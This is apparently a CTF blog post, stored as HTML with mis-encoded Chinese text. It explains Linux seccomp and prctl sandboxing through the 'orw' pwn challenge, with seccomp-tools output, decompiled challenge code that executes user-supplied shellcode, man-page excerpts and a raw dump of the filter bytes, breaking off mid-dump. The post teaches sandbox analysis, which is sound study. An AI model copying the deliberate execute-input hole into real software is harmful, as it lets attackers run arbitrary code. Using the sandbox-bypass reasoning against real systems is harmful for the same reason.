title="prctl-seccomp ç®€ä»‹"></a>prctl-seccomp ç®€ä»‹</h2><p>seccomp æ˜¯ secure computing çš„ç¼©å†™ï¼Œå…¶æ˜¯ä» Linux kernel 2.6.23ç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§ç®€æ´çš„ sandbox æœºåˆ¶ï¼Œå¯ä»¥å½“ä½œæ²™ç®±ä½¿ç”¨ã€‚åœ¨ç¼–å†™Cè¯­è¨€ç¨‹åºè¿‡ç¨‹ä¸­ï¼Œå¯ä»¥é€šè¿‡å¼•å…¥prctlå‡½æ•°æ¥å®ç°å†…æ ¸çº§çš„å®‰å…¨æœºåˆ¶ï¼›ç¨‹åºç¼–è¯‘è¿è¡Œåï¼Œç›¸å½“äºè¿›ç¨‹è¿›å…¥åˆ°ä¸€ç§â€œå®‰å…¨â€è¿è¡Œæ¨¡å¼ã€‚ä¸ºä»€ä¹ˆè¦å¼•å…¥è¿™æ ·ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Ÿæ­£å¸¸æƒ…å†µä¸‹åœ¨ Linux ç³»ç»Ÿé‡Œï¼Œå¤§é‡çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰ä¼šç›´æ¥æš´éœ²ç»™ç”¨æˆ·æ€ç¨‹åºï¼Œä¹Ÿå°±æ˜¯è¯´ç¨‹åºå¯ä»¥ä½¿ç”¨æ‰€æœ‰çš„syscallï¼Œæ­¤æ—¶å¦‚æœåŠ«æŒç¨‹åºæµç¨‹é€šè¿‡exeveæˆ–systemæ¥è°ƒç”¨syscallå°±ä¼šè·å¾—ç”¨æˆ·æ€çš„shellæƒé™ã€‚å¯ä»¥çœ‹åˆ°å¹¶ä¸æ˜¯æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨éƒ½è¢«éœ€è¦ï¼Œä¸å®‰å…¨çš„ä»£ç æ»¥ç”¨ç³»ç»Ÿè°ƒç”¨ä¼šå¯¹ç³»ç»Ÿé€ æˆå®‰å…¨å¨èƒã€‚ä¸ºäº†é˜²èŒƒè¿™ç§æ”»å‡»æ–¹å¼ï¼Œè¿™æ—¶seccompå°±æ´¾ä¸Šäº†ç”¨åœºï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹çš„è¿›ç¨‹åªèƒ½è°ƒç”¨4ç§ç³»ç»Ÿè°ƒç”¨ï¼Œå³ read()ã€write()ã€ exit() å’Œ sigreturn()ï¼Œå…¶ä»–çš„ç³»ç»Ÿè°ƒç”¨éƒ½ä¼šæ€æ­»è¿›ç¨‹ï¼Œè¿‡æ»¤æ¨¡å¼ä¸‹å¯ä»¥æŒ‡å®šå…è®¸é‚£äº›ç³»ç»Ÿè°ƒç”¨ï¼Œè§„åˆ™æ˜¯bpfï¼Œå¯ä»¥ä½¿ç”¨seccomp-toolsæŸ¥çœ‹ã€‚</p><blockquote><p>sandboxï¼šæ²™ç®±ã€æ²™ç›’</p></blockquote><h2 id="ä½¿ç”¨seccomp-toolsæŸ¥çœ‹å¯ç”¨ç³»ç»Ÿè°ƒç”¨ï¼ˆè¯†åˆ«æ²™ç®±è§„åˆ™ï¼‰"><a href="#ä½¿ç”¨seccomp-toolsæŸ¥çœ‹å¯ç”¨ç³»ç»Ÿè°ƒç”¨ï¼ˆè¯†åˆ«æ²™ç®±è§„åˆ™ï¼‰" class="headerlink" title="ä½¿ç”¨seccomp-toolsæŸ¥çœ‹å¯ç”¨ç³»ç»Ÿè°ƒç”¨ï¼ˆè¯†åˆ«æ²™ç®±è§„åˆ™ï¼‰"></a>ä½¿ç”¨seccomp-toolsæŸ¥çœ‹å¯ç”¨ç³»ç»Ÿè°ƒç”¨ï¼ˆè¯†åˆ«æ²™ç®±è§„åˆ™ï¼‰</h2><blockquote><p>å®‰è£…æ–¹å¼ï¼š<a href="https://github.com/david942j/seccomp-tools">https://github.com/david942j/seccomp-tools</a></p><p>$ gem install seccomp-tools</p><p>sudo apt install gcc ruby-dev</p></blockquote><p>æ‰§è¡Œå¦‚ä¸‹å›¾ä¸­å‘½ä»¤å³å¯æŸ¥çœ‹æ­¤ELFæ–‡ä»¶ä¸­å¯ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWNé¢˜/Range/pwnable.xyz$ seccomp-tools dump ./orww<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br>    <br></code></pre></td></tr></tbody></table></figure><p>##ä»IDAå¼€å§‹åˆ†æé¢˜ç›®</p><p>å°†é¢˜ç›®ä¸‹è½½ä¸‹æ¥ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹ç¨‹åºçš„ä»£ç ï¼Œç›´æ¥æ¥åˆ°mainå‡½æ•°ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  orw_seccomp();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give my your shellcode:"</span>);<br>  read(<span class="hljs-number">0</span>, &amp;shellcode, <span class="hljs-number">0xC8</span>u);<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))shellcode)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>è¿›å…¥orw_seccomp();</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">orw_seccomp</span><span class="hljs-params">()</span><br>{<br>  __int16 v1; <span class="hljs-comment">// [esp+4h] [ebp-84h] BYREF</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// [esp+8h] [ebp-80h]</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-7Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+6Ch] [ebp-1Ch]</span><br><br>  v4 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  qmemcpy(v3, &amp;unk_8048640, <span class="hljs-keyword">sizeof</span>(v3));<br>  v1 = <span class="hljs-number">12</span>;<br>  v2 = v3;<br>  prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2</span>, &amp;v1);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure><p>æˆ‘ä»¬æ³¨æ„ä¸€ä¸‹ä»£ç ä¸­çš„ä¸¤ä¸ªprctlï¼š</p><blockquote><p>prctl(38, 1, 0, 0, 0)</p><p>prctl(22, 2, &amp;v1);</p></blockquote><p>å…ˆè®°ä½è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œæ¥ä¸‹æ¥ä¼šæåˆ°ï¼Œè¿™é‡Œæš‚æ—¶å…ˆæ”¾ä¸€æ”¾ã€‚</p><h2 id="prctlå‡½æ•°åŸå‹"><a href="#prctlå‡½æ•°åŸå‹" class="headerlink" title="prctlå‡½æ•°åŸå‹"></a>prctlå‡½æ•°åŸå‹</h2><p>çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„åŸå‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prctl</span><span class="hljs-params">(<span class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span>; <br></code></pre></td></tr></tbody></table></figure><p>å‡½æ•°ä¸­æœ‰5ä¸ªå‚æ•°ï¼Œé‡ç‚¹æ¥çœ‹ä¸€ä¸‹å‚æ•°ä¸­çš„â€œint optionâ€ï¼Œå› ä¸ºoptionçš„ä¸­æ–‡æœ¬æ„æ˜¯é€‰æ‹©ï¼Œäº†è§£äº†è¿™ä¸ªå‚æ•°æˆ‘ä»¬ä¹Ÿå°±çŸ¥é“æ•´ä¸ªå‡½æ•°è¦å¹²å˜›ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦é‡ç‚¹å…³æ³¨ä¸¤ä¸ªé€‰é¡¹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">PR_SET_NO_NEW_PRIVS<br>PR_SET_SECCOMP<br></code></pre></td></tr></tbody></table></figure><p>å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªï¼ŒPR_SET_NO_NEW_PRIVSï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">Set the calling thread<span class="hljs-number">'</span>s no_new_privs attribute to the<br>value in arg2.  With no_new_privs <span class="hljs-built_in">set</span> to <span class="hljs-number">1</span>, execve(<span class="hljs-number">2</span>)<br>promises not to grant privileges to <span class="hljs-keyword">do</span> anything that could<br>not have been done without the <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-title function_">call</span> <span class="hljs-params">(<span class="hljs-keyword">for</span></span><br><span class="hljs-params">example, rendering the <span class="hljs-built_in">set</span>-user-ID and <span class="hljs-built_in">set</span>-group-ID mode</span><br><span class="hljs-params">bits, and file capabilities non-functional)</span>.  Once <span class="hljs-built_in">set</span>,<br>the no_new_privs attribute cannot be unset.  The setting<br>of this attribute is inherited by children created by<br><span class="hljs-title function_">fork</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> and <span class="hljs-title function_">clone</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>, and preserved across <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>.<br></code></pre></td></tr></tbody></table></figure><p>ç®€å•çš„è¯´ï¼Œå¦‚æœ option è®¾ç½®ä¸º PR_SET_NO_NEW_PRIVSå¹¶ä¸”ç¬¬äºŒä¸ªå‚æ•°ï¼ˆunsigned long arg2ï¼‰è®¾ç½®ä¸º 1ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¸èƒ½å¤Ÿè¿›è¡Œexecveçš„ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem å‡½æ•°ã€one_gadgetå¤±æ•ˆï¼Œä½†æ˜¯å…¶ä»–çš„ç³»ç»Ÿè°ƒç”¨ä»å¯ä»¥æ­£å¸¸è¿è¡Œï¼‰ï¼ŒåŒæ—¶è¿™ä¸ªé€‰é¡¹è¿˜ä¼šç»§æ‰¿ç»™å­è¿›ç¨‹ã€‚æ”¾åˆ°prctlå‡½æ•°ä¸­å°±æ˜¯ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(PR_SET_NO_NEW_PRIVS,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);     <span class="hljs-comment">//è®¾ä¸º1</span><br></code></pre></td></tr></tbody></table></figure><blockquote><p><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br>åœ¨æ—©æœŸä½¿ç”¨seccompæ˜¯ä½¿ç”¨prctlç³»ç»Ÿè°ƒç”¨å®ç°çš„ï¼Œåæ¥å°è£…æˆäº†ä¸€ä¸ªlibseccompåº“ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨seccomp_init,seccomp_rule_add,seccomp_loadæ¥è®¾ç½®è¿‡æ»¤è§„åˆ™ï¼Œä½†æ˜¯æˆ‘ä»¬å­¦ä¹ çš„è¿˜æ˜¯ä»prctlï¼Œè¿™ä¸ªç³»ç»Ÿè°ƒç”¨æ˜¯è¿›è¡Œè¿›ç¨‹æ§åˆ¶çš„ï¼Œè¿™é‡Œå…³æ³¨seccompåŠŸèƒ½ã€‚<br>é¦–å…ˆï¼Œè¦ä½¿ç”¨å®ƒéœ€è¦æœ‰CAP_SYS_ADMINæƒèƒ½ï¼Œå¦åˆ™å°±è¦è®¾ç½®PR_SET_NO_NEW_PRIVSä½ï¼Œè‹¥ä¸è¿™æ ·åšérootç”¨æˆ·ä½¿ç”¨è¿™ä¸ªç¨‹åºæ—¶seccompä¿æŠ¤å°†ä¼šå¤±æ•ˆï¼è®¾ç½®äº†PR_SET_NO_NEW_PRIVSä½åèƒ½ä¿è¯seccompå¯¹æ‰€æœ‰ç”¨æˆ·éƒ½èƒ½èµ·ä½œç”¨ï¼Œå¹¶ä¸”ä¼šä½¿å­è¿›ç¨‹å³execveåçš„è¿›ç¨‹ä¾ç„¶å—æ§ï¼Œæ„æ€å°±æ˜¯å³ä½¿æ‰§è¡Œexecveè¿™ä¸ªç³»ç»Ÿè°ƒç”¨æ›¿æ¢äº†æ•´ä¸ªbinaryæƒé™ä¸ä¼šå˜åŒ–ï¼Œè€Œä¸”æ­£å¦‚å…¶åå®ƒè®¾ç½®ä»¥åå°±ä¸èƒ½å†æ”¹äº†ï¼Œå³ä½¿å¯ä»¥è°ƒç”¨ptctlä¹Ÿä¸èƒ½å†æŠŠå®ƒç¦ç”¨æ‰ã€‚</p></blockquote><p>åœ¨ include/linux/prctl.h ä¸­æ‰¾åˆ° PR_SET_NO_NEW_PRIVS å¸¸é‡å¯¹åº”çš„æ•°å€¼ï¼Œæ­£å¥½æ˜¯ 38ï¼Œå› æ­¤ä¹Ÿå°±å¯¹åº”ä¸Šäº†ä¸Šè¿°é¢˜ç›®ä¸­çš„ç¬¬ä¸€ä¸ª prctl è¯­å¥ã€‚</p><p class='item-img' data-src='https://s2.loli.net/2023/09/14/6MpQe2EbhANUcPH.png'><img src="https://s2.loli.net/2023/09/14/6MpQe2EbhANUcPH.png" alt="Snipaste_2023-09-14_23-07-36.png"></p><p>æ¥ç€çœ‹ç¬¬äºŒä¸ªoptions PR_SET_SECCOMPï¼š</p><blockquote><p>Set the secure computing (seccomp) mode for the calling thread, </p><p>to limit the available system calls.</p></blockquote><p>ä¸€å¥è¯ï¼Œè¿™ä¸ªå‚æ•°æ˜¯ç”¨æ¥è®¾ç½® seccomp ï¼Œå…¶å®ä¹Ÿå°±æ˜¯è®¾ç½®æ²™ç®±æ˜¯å¦å¼€å¯ã€‚<br>å¸¸å¸¸ä¸å®ƒåœ¨prctlå‡ºç°çš„è¿˜æœ‰å¦‚ä¸‹ä¸¤ä¸ªå‚æ•°ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">SECCOMP_MODE_STRICTï¼š<br>    the only system calls that the thread is permitted to make are <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>,<br><span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>,_<span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-params">(but not exit_group(<span class="hljs-number">2</span>))</span>, and <span class="hljs-title function_">sigreturn</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span>. <br><br><span class="hljs-title function_">SECCOMP_MODE_FILTER</span> <span class="hljs-params">(since Linux <span class="hljs-number">3.5</span>)</span>ï¼š<br>    the system calls allowed are defined by a pointer to a Berkeley Packet <br>    Filter passed in arg3.  This argument is a pointer to <span class="hljs-keyword">struct</span> sock_fprog; <br>it can be designed to filter arbitrary system calls and system call arguments.<br>  <br><span class="hljs-number">1</span>ã€SECCOMP_MODE*<span class="hljs-title function_">STRICT</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span>ï¼š<br>å…è®¸çº¿ç¨‹è¿›è¡Œçš„å”¯ä¸€ç³»ç»Ÿè°ƒç”¨æ˜¯readï¼ˆ2ï¼‰ï¼Œwriteï¼ˆ2ï¼‰ï¼Œ*<span class="hljs-built_in">exit</span>ï¼ˆ2ï¼‰ï¼ˆä½†ä¸æ˜¯exit_groupï¼ˆ2ï¼‰ï¼‰<br>    å’Œsigreturnï¼ˆ2ï¼‰ã€‚<br><br>2ã€<span class="hljs-title function_">SECCOMP_MODE_FILTER</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span> <span class="hljs-params">(since Linux <span class="hljs-number">3.5</span>)</span>ï¼š<br>    å…è®¸çš„ç³»ç»Ÿè°ƒç”¨ç”±æŒ‡å‘arg3ä¸­ä¼ é€’çš„Berkeley Packet Filterçš„æŒ‡é’ˆå®šä¹‰ã€‚ <br>    è¿™ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæŒ‡å‘<span class="hljs-keyword">struct</span> sock_fprogçš„æŒ‡é’ˆ; å®ƒå¯ä»¥è®¾è®¡ä¸ºè¿‡æ»¤ä»»æ„ç³»ç»Ÿè°ƒç”¨å’Œç³»ç»Ÿè°ƒç”¨å‚æ•°<br></code></pre></td></tr></tbody></table></figure><p>ä¸Šè¿°è‹±æ–‡å¤§æ¦‚è¯´çš„æ˜¯å¦‚æœè®¾ç½®äº† SECCOMP_MODE_STRICT æ¨¡å¼çš„è¯ï¼Œç³»ç»Ÿè°ƒç”¨åªèƒ½ä½¿ç”¨ read, write,_exit è¿™ä¸‰ä¸ªã€‚å¦‚æœè®¾ç½®äº† SECCOMP_MODE_FILTER çš„è¯ï¼Œç³»ç»Ÿè°ƒç”¨è§„åˆ™å°±å¯ä»¥è¢« Berkeley Packet Filterï¼ˆBPFï¼‰ çš„è§„åˆ™æ‰€å®šä¹‰ï¼Œè¿™ç©æ„å°±æ˜¯è¿™é‡Œæœ€æœ€é‡ç‚¹çš„ä¸œè¥¿äº†ï¼Œè¿™ä¸ªä¸œè¥¿æ–‡ç« åé¢è¯´ã€‚<br>å°†è¿™å‡ ä¸ªå‚æ•°å¸¦å…¥åˆ°prctlï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<br><span class="hljs-comment">//ç¬¬ä¸€ä¸ªå‚æ•°è¦è¿›è¡Œä»€ä¹ˆè®¾ç½®ï¼Œç¬¬äºŒä¸ªæ˜¯è®¾ç½®ä¸ºè¿‡æ»¤æ¨¡å¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯è¿‡æ»¤è§„åˆ™</span><br><span class="hljs-comment">//PR_SET_SECCOMPï¼šæ§åˆ¶ç¨‹åºå»æ˜¯å¦å¼€å¯seccomp modeï¼Œ</span><br></code></pre></td></tr></tbody></table></figure><p>å…¶ä¸­SECCOMP_MODE_FILTER å¯ä»¥ç”¨å¸¸é‡è¡¨ç¤ºä¸º 2ï¼Œå›åˆ°ä¹‹å‰çš„é¢˜ï¼Œåœ¨ç¬¬äºŒä¸ª prctl å‡½æ•°ä¸­æ‰§è¡Œçš„å°±æ˜¯ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2</span>, &amp;v1);<br><span class="hljs-comment">//IDAä¸­åç¼–è¯‘çš„ä¸å‡†ç¡®ï¼Œå…¶å®&amp;v0ä»£è¡¨çš„å°±æ˜¯è¿‡æ»¤è§„åˆ™</span><br><span class="hljs-comment">//22åº”è¯¥å¯¹åº”çš„æ˜¯è¡¨ç¤ºseccomp modeæ˜¯å¼€å¯çŠ¶æ€ï¼ˆè¿™ä¸ªä¸å¤ªç¡®å®šï¼Œå› ä¸ºæˆ‘æ²¡æœ‰ç¿»æºç ï¼‰</span><br></code></pre></td></tr></tbody></table></figure><p>ä¸Šé¢v1æ‰€å‚¨å­˜çš„å†…å®¹è¡¨ç¤ºè®¾ç½®æ²™ç®±è§„åˆ™ï¼Œä»è€Œå¯ä»¥å®ç°æ”¹å˜å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆé€šè¡Œæˆ–è€…ç¦æ­¢ï¼‰ï¼šæˆ‘ä»¬åœ¨IDAä¸­å…·ä½“çœ‹ä¸€ä¸‹v1æ‰€å®šä¹‰çš„è§„åˆ™ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">.rodata:<span class="hljs-number">08048640</span> <span class="hljs-number">20</span>                            unk_8048640 db  <span class="hljs-number">20</span>h                     ; DATA XREF: orw_seccomp+<span class="hljs-number">17</span>â†‘o<br>.rodata:<span class="hljs-number">08048641</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048642</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048643</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048644</span> <span class="hljs-number">04</span>                            db    <span class="hljs-number">4</span><br>.rodata:<span class="hljs-number">08048645</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048646</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048647</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048648</span> <span class="hljs-number">15</span>                            db  <span class="hljs-number">15</span>h<br>.rodata:<span class="hljs-number">08048649</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864</span>A <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864B</span> <span class="hljs-number">09</span>                            db    <span class="hljs-number">9</span><br>.rodata:<span class="hljs-number">0804864</span>C <span class="hljs-number">03</span>                            db    <span class="hljs-number">3</span><br>.rodata:<span class="hljs-number">0804864</span>D <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864</span>E <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864F</span> <span class="hljs-number">40</span>                            db  <span class="hljs-number">40</span>h ; @<br>.rodata:<span class="hljs-number">08048650</span> <span class="hljs-number">20</span>                            db  <span class="hljs-number">20</span>h<br>.rodata:<span class="hljs-number">08048651</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048652</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048653</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048654</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048655</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048656</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048657</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048658</span> <span class="hljs-number">15</span>                            db  <span class="hljs-number">15</span>h<br>.rodata:<span class="hljs-number">08048659</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804865</span>A <span class="hljs-number">07</span>                            db    <span class="hljs-number">7</span><br>.rodata:<span class="hljs-number">0804865B</span> <span class="hljs-number">00</span>                            db    <span 